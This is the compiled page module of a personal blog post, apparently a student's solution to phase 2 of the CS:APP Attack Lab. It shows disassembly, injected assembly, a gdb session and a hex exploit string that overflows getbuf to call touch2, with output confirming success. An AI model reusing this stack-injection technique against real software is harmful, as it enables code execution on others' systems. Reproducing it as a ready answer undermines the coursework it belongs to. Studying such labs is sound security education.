import{_ as i}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,b as e,o as n}from"./app-BMihMyie.js";const l={};function t(h,s){return n(),a("div",null,[...s[0]||(s[0]=[e(`<h6 id="run" tabindex="-1"><a class="header-anchor" href="#run"><span>Run</span></a></h6><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">objdump</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --disassemble</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ctarget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ctarget.asm</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h6 id="read-file-cookie-txt" tabindex="-1"><a class="header-anchor" href="#read-file-cookie-txt"><span>Read File <code>cookie.txt</code></span></a></h6><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>0x3a9a6c2f</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h6 id="read-file-ctarget-asm" tabindex="-1"><a class="header-anchor" href="#read-file-ctarget-asm"><span>Read File <code>ctarget.asm</code></span></a></h6><div class="language-assembly line-numbers-mode" data-highlighter="shiki" data-ext="assembly" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-assembly"><span class="line"><span>...</span></span>
<span class="line"><span>0000000000401b28 &lt;getbuf&gt;:</span></span>
<span class="line"><span>  401b28:	48 83 ec 28          	sub    $0x28,%rsp</span></span>
<span class="line"><span>...</span></span>
<span class="line"><span>0000000000401b6a &lt;touch2&gt;:</span></span>
<span class="line"><span>...</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="write-file-phase-2-inject-s" tabindex="-1"><a class="header-anchor" href="#write-file-phase-2-inject-s"><span>Write File <code>phase-2-inject.s</code></span></a></h6><div class="language-assembly line-numbers-mode" data-highlighter="shiki" data-ext="assembly" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-assembly"><span class="line"><span>movl $0x3a9a6c2f, %edi</span></span>
<span class="line"><span>pushq $0x0000000000401b6a</span></span>
<span class="line"><span>retq</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="run-1" tabindex="-1"><a class="header-anchor" href="#run-1"><span>Run</span></a></h6><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">gcc</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -c</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> phase-2-inject.s</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">objdump</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --disassemble</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> phase-2-inject.o</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">phase-2-inject.asm</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="read-file-phase-2-inject-asm" tabindex="-1"><a class="header-anchor" href="#read-file-phase-2-inject-asm"><span>Read File <code>phase-2-inject.asm</code></span></a></h6><div class="language-assembly line-numbers-mode" data-highlighter="shiki" data-ext="assembly" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-assembly"><span class="line"><span>...</span></span>
<span class="line"><span>0000000000000000 &lt;.text&gt;:</span></span>
<span class="line"><span>   0:	bf 2f 6c 9a 3a       	mov    $0x3a9a6c2f,%edi</span></span>
<span class="line"><span>   5:	68 6a 1b 40 00       	pushq  $0x401b6a</span></span>
<span class="line"><span>   a:	c3                   	retq</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="run-2" tabindex="-1"><a class="header-anchor" href="#run-2"><span>Run</span></a></h6><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">$</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> gdb</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ctarget</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --tui</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">...</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">gdb</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">break</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> getbuf</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Breakpoint</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> at</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 0x401b28:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> buf.c,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> line</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 12.</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">gdb</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -q</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Starting</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> program:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /home/stu2020012872/3-lab-3-attacklab/target97/ctarget</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -q</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Breakpoint</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 1,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> getbuf</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> () at buf.c:12</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">gdb</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">stepi</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">gdb</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">info</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> registers</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> rsp</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">rsp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">            0x55668c98</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">       0x55668c98</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="write-file-phase-2-txt" tabindex="-1"><a class="header-anchor" href="#write-file-phase-2-txt"><span>Write File <code>phase-2.txt</code></span></a></h6><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>bf 2f 6c 9a 3a</span></span>
<span class="line"><span>68 6a 1b 40 00</span></span>
<span class="line"><span>c3</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>98 8c 66 55 00 00 00 00</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="run-3" tabindex="-1"><a class="header-anchor" href="#run-3"><span>Run</span></a></h6><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">./hex2raw</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &lt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">phase-2.txt</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">phase-2.in</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">./ctarget</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> phase-2.in</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="terminal-output" tabindex="-1"><a class="header-anchor" href="#terminal-output"><span>Terminal Output</span></a></h6><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>Cookie: 0x3a9a6c2f</span></span>
<span class="line"><span>Touch2!: You called touch2(0x3a9a6c2f)</span></span>
<span class="line"><span>Valid solution for level 2 with target ctarget</span></span>
<span class="line"><span>PASS: Sent exploit string to server to be validated.</span></span>
<span class="line"><span>NICE JOB!</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,20)])])}const d=i(l,[["render",t]]),k=JSON.parse('{"path":"/2022/course-work/csapp/attack-lab/2022-04-23-phase-2.html","title":"Attack Lab: Phase 2","lang":"en-US","frontmatter":{"category":["Course Work"],"date":"2022-04-23T00:00:00.000Z","modified":"2025-09-20T15:07:39.000Z","tags":["Attack_Lab","Computer_Organization_and_Architecture"],"title":"Attack Lab: Phase 2","description":"Run Read File cookie.txt Read File ctarget.asm Write File phase-2-inject.s Run Read File phase-2-inject.asm Run Write File phase-2.txt Run Terminal Output","head":[["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Attack Lab: Phase 2\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2022-04-23T00:00:00.000Z\\",\\"dateModified\\":null,\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"liblaf\\",\\"url\\":\\"https://github.com/liblaf\\"}]}"],["meta",{"property":"og:url","content":"https://hope.liblaf.me/2022/course-work/csapp/attack-lab/2022-04-23-phase-2.html"}],["meta",{"property":"og:site_name","content":"liblaf"}],["meta",{"property":"og:title","content":"Attack Lab: Phase 2"}],["meta",{"property":"og:description","content":"Run Read File cookie.txt Read File ctarget.asm Write File phase-2-inject.s Run Read File phase-2-inject.asm Run Write File phase-2.txt Run Terminal Output"}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"en-US"}],["meta",{"property":"article:tag","content":"Computer_Organization_and_Architecture"}],["meta",{"property":"article:tag","content":"Attack_Lab"}],["meta",{"property":"article:published_time","content":"2022-04-23T00:00:00.000Z"}]]},"git":{},"readingTime":{"minutes":0.82,"words":245},"filePathRelative":"2022/course-work/csapp/attack-lab/2022-04-23-phase-2.md","excerpt":"<h6>Run</h6>\\n<div class=\\"language-bash line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"bash\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code class=\\"language-bash\\"><span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">objdump</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> --disassemble</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> ctarget</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> &gt; </span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">ctarget.asm</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div></div></div>","autoDesc":true}');export{d as comp,k as data};
